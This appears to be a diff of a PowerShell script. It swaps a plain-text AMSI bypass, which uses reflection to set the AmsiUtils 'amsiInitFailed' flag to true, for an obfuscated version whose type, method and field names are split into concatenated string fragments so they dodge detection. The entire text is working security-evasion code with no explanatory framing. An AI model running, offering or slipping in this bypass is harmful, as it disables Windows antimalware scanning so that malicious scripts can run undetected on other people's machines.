@@ -1,5 +1,7 @@
-$a = [Ref].Assembly.GetTypes()
-ForEach($b in $a) {if ($b.Name -like '*iUtils') {$c = $b}}
-$d = $c.GetFields('NonPublic,Static')
-ForEach($e in $d) {if ($e.Name -like '*Failed') {$f = $e}}
-$f.SetValue($null,$true)
+$R=[Ref]."Assembly"
+$T='S'+'y'+'st'+'em.'+'Ma'+'na'+'gement.'+'Auto'+'mat'+'ion.'+'Amsi'+'U'+'tils'
+$G='Get'+'Type'
+$F='Get'+'Fie'+'ld'
+$V='Set'+'Va'+'lue'
+$F2='Non'+'Public,'+'Static'
+$R.$G($T).$F('amsi'+'Init'+'Failed',$F2).$V($null,$true)
